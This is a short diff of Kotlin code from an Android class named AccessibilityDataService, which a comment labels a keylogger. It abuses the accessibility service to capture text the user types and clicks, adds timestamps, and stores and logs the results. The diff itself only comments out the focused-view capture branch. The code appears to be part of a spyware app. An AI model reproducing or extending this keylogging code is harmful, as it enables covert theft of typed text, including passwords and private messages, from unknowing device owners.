@@ -37,7 +37,9 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     //keylogger
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
+
         when (event.eventType) {
+
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 val data = event.text.toString()
                 if (data != "[]") {
@@ -45,13 +47,13 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                     i(TAG, "${getDateTime()} |(TEXT)| $data")
                 }
             }
-            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
+            /*AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                 val data = event.text.toString()
                 if (data != "[]") {
                     interactor.setDataKey("${getDateTime()} |(FOCUSED)| $data")
                     i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                 }
-            }
+            }*/
             AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                 val data = event.text.toString()
                 if (data != "[]") {
